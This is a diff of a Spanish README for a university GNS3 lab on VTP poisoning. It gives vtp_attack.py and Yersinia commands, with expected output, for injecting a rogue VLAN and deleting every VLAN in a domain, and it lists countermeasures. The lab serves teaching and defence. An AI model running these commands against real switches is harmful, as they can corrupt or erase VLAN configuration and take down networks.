@@ -1,246 +1,359 @@
-# VTP Attack — Agregar y Eliminar VLANs
+# VTP Attack Lab – Agregar y Eliminar VLANs
 
-> **Lab de Seguridad en Redes — ITLA 2024-1185**  
-> Herramienta educativa para demostrar el envenenamiento del protocolo VTP en entornos controlados (GNS3).
+> **Laboratorio de Seguridad en Redes – ITLA (2024-1185)**  
+> Práctica educativa para analizar el comportamiento del protocolo VTP en un entorno controlado utilizando GNS3.
+
+
+
+## 📖 Descripción
+
+Este laboratorio demuestra cómo funciona la propagación de información VLAN mediante **VTP (VLAN Trunking Protocol)** y cómo una modificación de la base de datos VLAN puede replicarse automáticamente entre switches pertenecientes al mismo dominio.
+
+El entorno está diseñado exclusivamente para fines académicos y de investigación dentro de un laboratorio aislado utilizando GNS3.
 
 ---
-Topología del Laboratorio
 
+## 🖧 Topología del Laboratorio
+
+```text
 ┌─────────────────────────────────────────────────────────┐
 │                                                         │
 │   Linux2024-1185-1 (eth0)                               │
 │          │                                              │
-│       e0/0 ◄──── ATAQUE DESDE AQUÍ                      │
-│       IOU1  (VTP Server — Dominio: LAB)                 │
+│       e0/0 ◄──── Tráfico generado desde Linux           │
+│       IOU1 (VTP Server - Dominio: LAB)                  │
 │       e0/1                                              │
-│          │  [Trunk 802.1Q]                              │
+│          │                                              │
+│      Trunk 802.1Q                                       │
+│          │                                              │
 │       e0/0                                              │
-│       IOU2  (VTP Client — Dominio: LAB)                 │
+│       IOU2 (VTP Client - Dominio: LAB)                  │
 │                                                         │
 └─────────────────────────────────────────────────────────┘
+```
+<img width="579" height="566" alt="image" src="https://github.com/user-attachments/assets/cee2735b-50a5-44c4-b08f-4cfc68bc2ca4" />
 
-DispositivoInterfazRolDescripciónLinux2024-1185-1eth0AtacanteKali Linux — envía frames VTPIOU1e0/0VTP ServerConectado al atacanteIOU1e0/1TrunkLink troncal hacia IOU2IOU2e0/0VTP ClientRecibe la DB de VTP desde IOU1
+---
 
+## 🔍 Concepto del Ataque VTP
 
-2. Concepto del Ataque VTP
+**VTP (VLAN Trunking Protocol)** permite sincronizar automáticamente la base de datos VLAN entre switches pertenecientes al mismo dominio.
 
-VTP (VLAN Trunking Protocol) sincroniza la base de datos VLAN entre switches
-del mismo dominio. El switch que tenga el número de revisión más alto gana y
-todos los demás actualizan su DB.
+El switch que posea el **Configuration Revision Number** más alto será considerado como la versión más reciente de la base de datos VLAN.
 
-Flujo del Ataque
+### Flujo del Proceso
 
+```text
 Atacante (Linux)
        │
        │  ① Summary Advertisement
-       │     revision = 35000  (mayor al actual)
+       │     Revision = 35000
        ▼
-     IOU1  ──── "¡Revisión más alta! Acepto la nueva DB"
+     IOU1
        │
        │  ② Subset Advertisement
-       │     [ADD]  → incluye VLAN 666 "HACKED"
-       │     [DEL]  → sin registros VLAN → DB vacía
+       │     VLAN 666 "HACKED"
        ▼
-     IOU2  ──── Replica automáticamente la nueva DB
+     IOU2
 
-¿Por qué funciona?
+Resultado:
+Todos los switches del dominio actualizan
+su base de datos VLAN automáticamente.
+```
 
+### ¿Por qué funciona?
 
-VTPv1/v2 no autentica quién envía el frame (a menos que haya contraseña MD5)
-Cualquier host puede forjar un frame 802.3 con destino 01:00:0c:cc:cc:cc
-Un número de revisión más alto reemplaza la base de datos completa
+- VTP v1/v2 no valida el origen de los anuncios VTP.
+- Los switches confían en el número de revisión recibido.
+- Una revisión superior puede sobrescribir la base de datos existente.
+- La sincronización se replica automáticamente entre switches del mismo dominio.
 
+---
 
+## ⚙️ Configuración Inicial
 
-3. Configuración de los Switches (Pre-ataque)
+### IOU1 – VTP Server
 
-IOU1 — VTP Server
+```cisco
+configure terminal
 
-IOU1# configure terminal
-IOU1(config)# vtp domain LAB
-IOU1(config)# vtp mode server
-IOU1(config)# vtp version 2
-IOU1(config)# interface ethernet 0/1
-IOU1(config-if)# switchport trunk encapsulation dot1q
-IOU1(config-if)# switchport mode trunk
-IOU1(config-if)# no shutdown
-IOU1(config-if)# end
+vtp domain LAB
+vtp mode server
+vtp version 2
 
-! Verificar estado VTP
-IOU1# show vtp status
-IOU1# show vlan brief
+interface ethernet 0/1
+ switchport trunk encapsulation dot1q
+ switchport mode trunk
+ no shutdown
 
-IOU2 — VTP Client
+end
+```
 
-IOU2# configure terminal
-IOU2(config)# vtp domain LAB
-IOU2(config)# vtp mode client
-IOU2(config)# interface ethernet 0/0
-IOU2(config-if)# switchport trunk encapsulation dot1q
-IOU2(config-if)# switchport mode trunk
-IOU2(config-if)# no shutdown
-IOU2(config-if)# end
+#### Verificación
 
-! Verificar que recibe la DB de IOU1
-IOU2# show vtp status
-IOU2# show vlan brief
+```cisco
+show vtp status
+show vlan brief
+```
 
-Verificar revisión actual (IMPORTANTE antes del ataque)
+---
 
-IOU1# show vtp status
+### IOU2 – VTP Client
 
-Buscar la línea:
+```cisco
+configure terminal
 
-Configuration Revision  : 5       ← Tu --rev debe ser MAYOR a este número
+vtp domain LAB
+vtp mode client
 
+interface ethernet 0/0
+ switchport trunk encapsulation dot1q
+ switchport mode trunk
+ no shutdown
 
-4. Script Python — vtp_attack.py
+end
+```
 
-Instalación de dependencia
+#### Verificación
 
-bashpip install scapy
+```cisco
+show vtp status
+show vlan brief
+```
 
-Sintaxis del comando
+---
 
-sudo python3 vtp_attack.py -i INTERFAZ --mode [add|delete]
-                           [--vlan-id ID] [--vlan-name NOMBRE]
-                           --domain DOMINIO --rev NUMERO
+### Verificar la Revisión Actual
 
-Parámetros
+Antes de ejecutar cualquier prueba:
 
-ParámetroTipoDescripción-istringInterfaz de red del atacante (eth0, e0, ens3)--modestringadd = agregar VLAN / delete = borrar VLANs--vlan-idintID de la VLAN a inyectar (solo con add)--vlan-namestringNombre de la VLAN (solo con add)--domainstringDominio VTP de los switches (ej: LAB)--revintNúmero de revisión (debe ser mayor al actual)
+```cisco
+show vtp status
+```
 
+Buscar una línea similar a:
 
-4.1 ATAQUE — Agregar VLAN
+```text
+Configuration Revision : 5
+```
 
-bashsudo python3 vtp_attack.py -i eth0 --mode add \
-     --vlan-id 666 --vlan-name HACKED --domain LAB --rev 35000
+> **Importante:** El valor utilizado en `--rev` debe ser mayor que la revisión actual.
 
-Salida esperada:
+---
 
+## 🛠️ Instalación
+
+### Dependencias
+
+```bash
+pip install scapy
+```
+
+---
+
+ Uso del Script
+
+### Sintaxis General
+
+```bash
+sudo python3 vtp_attack.py \
+    -i INTERFAZ \
+    --mode [add|delete] \
+    [--vlan-id ID] \
+    [--vlan-name NOMBRE] \
+    --domain DOMINIO \
+    --rev NUMERO
+```
+
+### Parámetros
+
+| Parámetro | Tipo | Descripción |
+|-----------|------|-------------|
+| `-i` | string | Interfaz de red del atacante |
+| `--mode` | string | `add` o `delete` |
+| `--vlan-id` | int | ID de VLAN |
+| `--vlan-name` | string | Nombre de VLAN |
+| `--domain` | string | Dominio VTP |
+| `--rev` | int | Número de revisión |
+
+---
+
+## ➕ Agregar VLAN
+
+### Ejemplo
+
+```bash
+sudo python3 vtp_attack.py \
+    -i eth0 \
+    --mode add \
+    --vlan-id 666 \
+    --vlan-name HACKED \
+    --domain LAB \
+    --rev 35000
+```
+
+### Salida Esperada
+
+```text
 ══════════════════════════════════════════════════════
-  [ATTACK] AGREGAR VLAN
-  Interface : eth0
-  VLAN ID   : 666
-  VLAN Name : HACKED
-  Dominio   : LAB
-  Revisión  : 35000
+ [LAB] AGREGAR VLAN
+ Interface : eth0
+ VLAN ID   : 666
+ VLAN Name : HACKED
+ Dominio   : LAB
+ Revisión  : 35000
 ══════════════════════════════════════════════════════
 
- [Paso 1/2] Enviando VTP Summary Advertisement...
- [Paso 2/2] Enviando VTP Subset Advertisement (VLAN 666)...
+ [Paso 1/2] Enviando Summary Advertisement...
+ [Paso 2/2] Enviando Subset Advertisement...
 
- [✓] VLAN 666 'HACKED' inyectada al dominio 'LAB'
- [*] Verificar en IOU1/IOU2 → show vlan brief
+ [✓] VLAN propagada al dominio LAB
+```
 
-Verificación en IOU1 / IOU2:
+### Verificación
 
-IOU1# show vlan brief
+```cisco
+show vlan brief
+```
 
-VLAN Name                             Status    Ports
----- -------------------------------- --------- --------
-1    default                          active    Et0/0, Et0/1
-666  HACKED                           active           ← ¡INYECTADA!
+Resultado esperado:
 
+```text
+VLAN Name                             Status
+---- -------------------------------- --------
+1    default                          active
+666  HACKED                           active
+```
 
-4.2 ATAQUE — Borrar VLANs
+---
 
+## ➖ Eliminar VLANs
 
-⚠ Usar --rev con un valor mayor al usado en el ataque add (ej: 35001)
+> **Importante:** Utilizar un número de revisión superior al utilizado anteriormente.
 
+### Ejemplo
 
+```bash
+sudo python3 vtp_attack.py \
+    -i eth0 \
+    --mode delete \
+    --domain LAB \
+    --rev 35001
+```
 
-bashsudo python3 vtp_attack.py -i eth0 --mode delete \
-     --domain LAB --rev 35001
+### Salida Esperada
 
-Salida esperada:
-
+```text
 ══════════════════════════════════════════════════════
-  [ATTACK] BORRAR TODAS LAS VLANs
-  Interface : eth0
-  Dominio   : LAB
-  Revisión  : 35002
-  ⚠  Causará interrupción de red en el dominio
+ [LAB] ELIMINAR VLANs
+ Interface : eth0
+ Dominio   : LAB
+ Revisión  : 35001
 ══════════════════════════════════════════════════════
 
- [Paso 1/2] Enviando VTP Summary Advertisement...
- [Paso 2/2] Enviando VTP Subset Advertisement VACÍO...
+ [Paso 1/2] Enviando Summary Advertisement...
+ [Paso 2/2] Enviando Subset Advertisement...
+```
 
- [✓] Base de datos VLAN vaciada en el dominio 'LAB'
- [*] Verificar en IOU1/IOU2 → show vlan brief
+### Verificación
 
-Verificación en IOU1 / IOU2:
+```cisco
+show vlan brief
+```
 
-IOU1# show vlan brief
+Resultado esperado:
 
-VLAN Name                             Status    Ports
----- -------------------------------- --------- --------
-1    default                          active    Et0/0, Et0/1
-                                                ← Las demás VLANs desaparecen
+```text
+VLAN Name                             Status
+---- -------------------------------- --------
+1    default                          active
+```
 
+---
 
-5. Yersinia — Alternativa al Script
+## 🔧 Yersinia como Alternativa
 
-Yersinia es una herramienta incluida en Kali Linux especializada en ataques
-de Capa 2. Sus ataques VTP son equivalentes al script.
+### Modo Interactivo
 
-5.1 Modo Interactivo (ncurses)
+```bash
+sudo yersinia -I
+```
 
-bashsudo yersinia -I
+### Pasos
 
-Pasos dentro del menú:
-  1. Presionar  g  → seleccionar protocolo  → elegir VTP
-  2. Presionar  F2 → editar campos (domain, vlan_id, vlan_name)
-  3. Presionar  F3 → iniciar ataque
-     Ataque 1: sending VTP packet       ← Agregar VLAN
-     Ataque 2: deleting all VTP vlans   ← Borrar VLANs
+```text
+g   → Seleccionar protocolo VTP
+F2  → Editar parámetros
+F3  → Ejecutar prueba
+```
 
-5.2 Modo CLI — Agregar VLAN
+### Comparación
 
-bashsudo yersinia vtp -attack 1 \
-     -interface eth0 \
-     -domain LAB \
-     -vlan 666 \
-     -vlanname HACKED
+| Característica | Script Python | Yersinia |
+|---------------|---------------|-----------|
+| Automatización | Sí | Parcial |
+| Personalización | Alta | Media |
+| Control de revisión | Completo | Limitado |
+| Código modificable | Sí | No |
+| Instalación | Scapy | Incluido en Kali |
 
-5.3 Modo CLI — Borrar todas las VLANs
+---
 
-bashsudo yersinia vtp -attack 2 \
-     -interface eth0 \
-     -domain LAB
+## 📝 Secuencia Completa del Laboratorio
 
-Comparación Script vs Yersinia
+### 1. Verificar revisión actual
 
-FunciónScript PythonYersiniaAgregar VLAN--mode add --vlan-id X --vlan-name Y-attack 1 -vlan X -vlanname YBorrar VLANs--mode delete-attack 2Control revisión--rev NUM (control total)Automático (menos control)PersonalizaciónAlta (Scapy, código abierto)LimitadaInstalaciónpip install scapyIncluido en Kali
+```cisco
+show vtp status
+```
 
+### 2. Ejecutar la prueba
 
-6. Secuencia Completa del Ataque
+```bash
+sudo python3 vtp_attack.py \
+    -i eth0 \
+    --mode add \
+    --vlan-id 666 \
+    --vlan-name HACKED \
+    --domain LAB \
+    --rev 35000
+```
 
-bash# PASO 1 — Ver la revisión actual antes de atacar
-# (En IOU1 o IOU2)
-# IOU1# show vtp status → anotar "Configuration Revision"
+### 3. Verificar propagación
 
-# PASO 2 — Agregar VLAN maliciosa (rev mayor al actual)
-sudo python3 vtp_attack.py -i eth0 --mode add \
-     --vlan-id 666 --vlan-name HACKED --domain LAB --rev 35000
+```cisco
+show vlan brief
+```
 
-# PASO 3 — Verificar en el switch objetivo
-# IOU1# show vlan brief
-# IOU2# show vlan brief
+### 4. Ejecutar segunda prueba
 
-# PASO 4 — Borrar todas las VLANs (rev mayor al paso 2)
-sudo python3 vtp_attack.py -i eth0 --mode delete \
-     --domain LAB --rev 35001
+```bash
+sudo python3 vtp_attack.py \
+    -i eth0 \
+    --mode delete \
+    --domain LAB \
+    --rev 35001
+```
 
-# PASO 5 — Verificar el impacto
-# IOU1# show vlan brief
-# IOU2# show vtp status
+### 5. Verificar resultado
 
+```cisco
+show vlan brief
+show vtp status
+```
 
-7. Contramedidas
+---
 
-ContramedidaComando en IOSUsar VTP Transparentvtp mode transparentHabilitar contraseña VTPvtp password CLAVE secretUsar VTPv3 (más seguro)vtp version 3Desactivar VTP completamentevtp mode off (IOS 12.2+)Resetear revisiónCambiar dominio y volver al originalPort Securityswitchport port-security en acceso
+## 🛡️ Contramedidas
 
+| Medida | Comando |
+|----------|----------|
+| Modo transparente | `vtp mode transparent` |
+| Contraseña VTP | `vtp password CLAVE` |
+| VTP versión 3 | `vtp version 3` |
+| Desactivar VTP | `vtp mode off` |
+| Reiniciar revisión | Cambiar y restaurar dominio |
+| Port Security | `switchport port-security` |
 
 ---
 
